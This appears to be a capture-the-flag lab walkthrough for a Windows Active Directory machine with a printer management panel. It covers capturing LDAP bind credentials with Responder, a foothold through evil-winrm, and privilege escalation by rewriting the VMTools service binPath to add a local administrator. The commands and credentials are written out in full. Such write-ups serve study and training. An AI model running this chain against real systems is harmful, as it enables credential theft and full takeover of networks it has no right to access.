# Return: Machine Notes

## Recon

### Nmap
- Port 80/tcp: HTTP (Printer Management Panel)
- Port 5985/tcp: WinRM
- AD Ports: 53, 88, 135, 139, 389, 445, 636, 3268, 3269

### Web Portal Enumeration
- The web interface at `http://[IP]/` features a printer management panel.
- Navigate to "Settings" -> "LDAP".
- The device connects to an LDAP server to authenticate users.

## Initial Access

### Credential Leak (Responder)
- Change the "Server Address" in the LDAP settings to the attacker IP (Kali).
- Start `responder` to capture the bind request:
```bash
sudo responder -I tun0 -v
```
- Capture cleartext credentials from the LDAP bind:
  - User: `return\svc-printer`
  - Password: `1edFg43012!!`

### Foothold
- Access the machine via WinRM:
```bash
evil-winrm -i 10.129.95.241 -u 'svc-printer' -p '1edFg43012!!'
```

## Privilege Escalation

### Service Misconfiguration (Server Operators)
- `svc-printer` is a member of the **Server Operators** group.
- Server Operators have the right to modify service configurations.
- Identify the `VMTools` service as modifiable:
```powershell
sc.exe qc VMTools
```
- Modify the `binPath` to add a local administrator:
```powershell
sc.exe config VMTools binPath= "C:\Windows\System32\cmd.exe /c net user privesc P@ssw0rd123! /add && net localgroup administrators privesc /add"
```
- Re-run the service to execute the command (it will fail start but apply the changes):
```powershell
sc.exe stop VMTools
sc.exe start VMTools
```

### Root Access
- Log in as the new admin user:
```bash
evil-winrm -i 10.129.95.241 -u 'privesc' -p 'P@ssw0rd123!'
```
- Or used the newly gained privileges to dump hashes.
